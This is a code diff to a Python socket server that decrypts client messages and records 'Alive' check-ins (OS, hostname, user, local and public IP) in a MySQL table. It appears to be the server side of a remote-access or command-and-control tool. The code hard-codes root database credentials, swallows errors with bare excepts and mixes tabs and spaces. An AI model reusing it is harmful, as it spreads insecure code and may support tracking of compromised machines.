@@ -42,8 +42,11 @@ class ClientThread(threading.Thread):
 
                 PSK = get_key_from_mac(mac)
                 key = hashlib.sha256(PSK).digest()
-
-                msg = decrypt(encrypt,key)
+		try:
+                	msg = decrypt(encrypt,key)
+		except:
+			print("[-] Corrupted message")
+			pass
 
 		if "Infos" in str(msg):
 	                infos = str(msg)
@@ -82,7 +85,42 @@ class ClientThread(threading.Thread):
                 	else:
                         	print("debug")
                 		# Ajoute les informations clientes dans la base de données
+		if "Alive" in str(msg):
+		        infos = str(msg)
+
+		        for items in infos.split(','):
+		            array_infos.append(items)
+
+		        if str(array_infos[2]) == "nt":
+		            array_infos[2] = "Windows"
+		        else:
+		            array_infos[2] = "Unix"
+
+		        array_infos[0] = array_infos[0].replace("b'", "")
+		        array_infos[-1] = array_infos[-1].replace("'", "")
+
+			alive_date = str(array_infos[0])
+			uuid = str(array_infos[1])
+
+			db = MySQLdb.connect("localhost","root","toor","clients")
+			cursor = db.cursor()
+
+			try:
+				cursor.execute("""UPDATE clients.clients SET status = %s, os = %s, computer = %s, lip = %s, user = %s, pip = %s, last_alive = %s WHERE uuid = %s""",('Alive',array_infos[2],array_infos[3],array_infos[4],array_infos[5],array_infos[6],[alive_date],[uuid]))
+				cursor.execute("""UPDATE clients.clients SET status = %s WHERE uuid = %s""",('Alive',[uuid]))
+				db.commit()
+				print("[+] Client is alive : " + str(array_infos[1]))
+			except:
+
+				db.rollback()
+				print(str(alive_date))
+				print("[-] Cannot update this alive client : " + str(array_infos))
+
+			db.close()
+			#Upgrade BDD avec dernière conenxion
+
 		else:
+			msg = str(msg).replace("\r\n","\n")
 			print("Unknown format message " + str(msg))
 
 
